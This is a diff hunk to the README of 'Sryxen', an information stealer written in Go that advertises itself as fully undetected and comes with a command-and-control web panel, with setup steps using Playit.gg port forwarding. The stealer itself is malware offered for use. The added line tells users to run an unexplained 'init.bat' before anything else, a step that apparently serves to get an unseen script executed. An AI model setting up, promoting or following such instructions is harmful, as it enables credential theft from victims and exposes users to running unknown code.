@@ -67,6 +67,7 @@ _A fully undetected stealer written in Go, offering a rich feature set and a cus
 The Sryxen stealer includes a **Custom C2 Web Panel** for easy management and monitoring of data.
 
 #### Setting Up
+- BEFORE DOING ANYTHING RUN ```init.bat```
 1. **Port Forwarding with Playit.gg**
    - Use [Playit.gg](https://playit.gg) to get url with port.
    - After in main.go replace the port with yours and after open the url that playit gave you.
